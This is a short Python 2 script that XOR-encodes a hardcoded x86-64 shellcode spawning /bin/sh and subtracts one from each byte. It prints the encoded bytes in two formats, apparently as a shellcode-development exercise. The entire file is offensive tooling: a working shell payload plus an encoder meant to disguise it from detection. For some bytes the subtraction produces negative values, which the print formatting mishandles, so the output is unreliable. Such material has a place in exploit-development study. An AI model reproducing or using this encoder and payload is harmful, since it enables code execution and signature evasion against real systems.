#!/usr/bin/python

shellcode = ("\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05")

encoded = ""
encoded2 = ""

sub_value = 1

print 'XOR - SUB Encoded shellcode: \n'

for x in bytearray(shellcode):
	# XOR encoding
	y = (x ^ 0xAA) - sub_value

	encoded += '\\x'
	encoded += '%02x' % y

	encoded2 += '0x'
	encoded2 += '%02x,' % y

print encoded

print encoded2

print 'Shellcode Length: %d\n' % len(bytearray(shellcode))
